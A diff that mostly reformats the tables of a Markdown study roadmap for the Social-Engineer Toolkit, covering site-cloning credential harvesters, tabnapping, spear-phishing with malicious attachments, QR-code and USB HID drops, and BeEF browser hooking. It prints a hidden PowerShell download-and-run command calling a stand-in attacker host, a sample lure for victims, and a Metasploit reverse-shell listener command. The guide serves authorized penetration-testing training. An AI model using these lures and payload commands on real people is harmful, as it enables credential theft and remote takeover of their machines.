@@ -17,16 +17,16 @@
 > [[Cyber-Security/Roadmap/README|🏠 Master Roadmap]] · [[Cyber-Security/Roadmap/Tools/README|🔧 Tools Index]]
 
 | Phishing Platforms | Social Engineering Toolkit | Credential Capture | Payload Delivery |
-|:-------------------|:---------------------------|:-------------------|:-----------------|
+| :------------------- | :--------------------------- | :------------------- | :----------------- |
 | [[GoPhish\|🎣 GoPhish]] | **🎭 SET** (you are here) | [[Responder\|📡 Responder]] | [[Metasploit_Framework\|💀 Metasploit]] |
-| | | [[Evil-WinRM\|🪟 Evil-WinRM]] | [[Sliver\|🐍 Sliver]] |
+||| [[Evil-WinRM\|🪟 Evil-WinRM]] | [[Sliver\|🐍 Sliver]] |
 
 ---
 
 ## 📊 Progress Overview
 
 | Phase | Focus | Tasks | Est. Time |
-|:---:|:---|:---:|:---:|
+| :---: | :--- | :---: | :---: |
 | 1 | Fundamentals | 4 | 1–2 hours |
 | 2 | Website Attacks | 4 | 2–3 hours |
 | 3 | Spear Phishing | 3 | 2–3 hours |
@@ -35,7 +35,7 @@
 | 6 | Integration | 2 | 1–2 hours |
 | 7 | Practical Labs | 3 | 3–5 hours |
 | 8 | Mastery Challenges | 2 | 2–3 hours |
-| | **Total** | **23** | **~13–22 hours** |
+|| **Total** | **23** | **~13–22 hours** |
 
 ---
 
@@ -48,7 +48,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **1) Social Engineering Attacks** | Main attack module. Website attacks, spear phishing, HID. |
 | **2) Penetration Testing** | Fast-track attacks. Metasploit integration. |
 | **3) Third Party Modules** | Additional modules. |
@@ -63,7 +63,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 5 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Kali** | Pre-installed. `sudo setoolkit`. |
 | **Manual** | `git clone https://github.com/trustedsec/social-engineer-toolkit; pip3 install -r requirements.txt; sudo python3 setup.py`. |
 
@@ -74,7 +74,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **SET** | Quick. Command-line menus. Serves harvester from local Kali. No tracking dashboard. Good for lab demos. |
 | **GoPhish** | Full campaign management. Web UI. Tracking (opened, clicked, submitted). Scheduling. Multi-target reporting. Good for real engagements. |
 | **Both** | Use SET for rapid demos and payloads. GoPhish for managed, tracked campaigns. |
@@ -86,7 +86,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 5 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Authorization** | Any social engineering attack requires explicit written authorization. |
 | **Scope** | Only use against explicitly authorized targets. |
 
@@ -101,7 +101,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Path** | SET → 1 (Social Engineering) → 2 (Website Attack Vectors) → 3 (Credential Harvester) → 2 (Site Cloner). |
 | **Enter** | Your IP address (for the POST redirect). URL to clone (e.g., `https://accounts.google.com`). |
 | **Result** | SET starts a web server on port 80. Cloned site served. When victim visits and submits: credentials captured and displayed in terminal. |
@@ -113,7 +113,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Path** | Credential Harvester → 1 (Web Templates). Choose pre-built templates: Gmail, Facebook, Twitter. |
 | **Custom** | Or place custom HTML in `/usr/share/set/src/html/` and choose "Custom Import". |
 
@@ -124,7 +124,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Concept** | Victim visits a legitimate-looking page. When they switch to another tab, the SET page silently changes to a login page. When they return, they see a "session expired" login page and re-enter credentials. |
 | **Path** | Website Attack Vectors → 4 (Tabnapping). |
 
@@ -135,7 +135,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Path** | Website Attack Vectors → 6 (Multi-Attack Web Method). |
 | **Combo** | Simultaneously serves: credential harvester + Metasploit payload + Java applet (if applicable). First attack to succeed wins. |
 
@@ -150,7 +150,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Path** | SET → 1 → 1 (Spear Phishing Attack). |
 | **Payload** | Select payload type: Metasploit reverse shell EXE, malicious PDF, Office doc with macro, etc. |
 | **Send** | SET sends the email with the malicious attachment via SMTP. |
@@ -163,7 +163,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Concept** | Malicious Office document with macro, PDF exploit, etc. Sent as email attachment. Victim opens → executes payload. |
 | **SET + MSF** | SET generates the malicious file → Metasploit listener catches the reverse connection. |
 | **AV** | Default SET payloads are heavily signatured. AV will quarantine most. Real engagements require custom/obfuscated payloads. |
@@ -175,7 +175,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Workflow** | SET generates malicious payload file. Upload to GoPhish as the "download" on the landing page. GoPhish sends the phishing email with a link to the GoPhish-served download. Metasploit listens for the reverse connection. |
 
 ---
@@ -189,7 +189,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Path** | SET → 1 → 10 (PowerShell Attack Vectors). |
 | **Options** | PowerShell alphanumeric shellcode injector. Powershell Reverse Shell. Bind Shell. SecureString. |
 | **Output** | SET generates a PowerShell one-liner that victims run. Delivers payload in-memory. |
@@ -201,7 +201,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | SET generates: `powershell -W Hidden -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"`. |
 | **Delivery** | Embed in phishing email body. Social engineer victim into running it. "Please run this PowerShell command to fix your VPN issue." |
 
@@ -212,7 +212,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **MSF** | SET prompts to auto-launch Metasploit listener. Or: manual: `msfconsole -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST X; set LPORT 4444; run"`. |
 
 ---
@@ -226,7 +226,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Concept** | Generate a QR code pointing to a SET-hosted credential harvester. Print and place in physical environments ("Scan for free Wi-Fi", "Scan to register"). |
 | **Path** | Website Attack Vectors → QR Code Generator. Enter URL of harvester. QR code generated. |
 
@@ -237,7 +237,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Concept** | HID (Human Interface Device) attack: USB device impersonates keyboard. Plugged into target → types commands automatically at superhuman speed → installs payload. |
 | **SET** | SET → 1 → 7 (Arduino-Based Attack Vector). Generates script for Teensy/Arduino. |
 | **Physical** | Requires physical access. Disguise as USB charger, USB drive. Drop in target's environment. |
@@ -253,7 +253,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Auto** | Many SET payloads auto-launch Metasploit listener. |
 | **Manual** | Generate payload with SET → start listener manually with correct payload/LHOST/LPORT → wait for callback. |
 | **Meterpreter** | Use Meterpreter sessions for post-exploitation: hashdump, screenshot, keyscan, migrate. |
@@ -265,7 +265,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **BeEF** | Browser Exploitation Framework. Hooks victim's browser via JavaScript. |
 | **Combo** | SET serves cloned page with BeEF hook injected. Victim visits → browser hooked → attack via BeEF commands. |
 | **Attacks** | Get browser info, steal cookies, redirect, alert, run browser exploits. |
@@ -328,7 +328,7 @@
 # 📋 FINAL COMPETENCY MATRIX
 
 | Competency | Self-Assessment |
-|:---|:---:|
+| :--- | :---: |
 | Can set up a credential harvester using site cloner | ☐ |
 | Can clone any website for a harvesting page | ☐ |
 | Can generate and deliver a PowerShell payload via SET | ☐ |
